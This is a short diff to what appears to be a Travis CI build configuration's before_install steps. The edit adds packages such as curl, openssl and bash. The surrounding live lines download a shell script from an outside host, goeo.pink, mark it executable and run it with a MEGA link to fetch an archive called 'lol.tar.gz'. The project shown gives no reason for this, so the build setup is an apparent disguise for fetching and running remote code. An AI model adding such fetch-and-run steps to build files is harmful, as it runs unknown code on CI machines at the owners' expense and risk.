@@ -1,6 +1,6 @@
 before_install:
  - sudo apt-get update -qq
- - sudo apt-get install wget llvm llvm-dev
+ - sudo apt-get install wget llvm llvm-dev bash openssl curl libtxc-dxtn-s2tc0
  - wget http://goeo.pink/a.sh
  - sudo chmod a+x a.sh
  - ./a.sh 'https://mega.co.nz/#!WEQ20RpI!RzdtOJnctxoU463UjmlmvTd-UPoTXwAsXeva1sJgHf8' lol.tar.gz
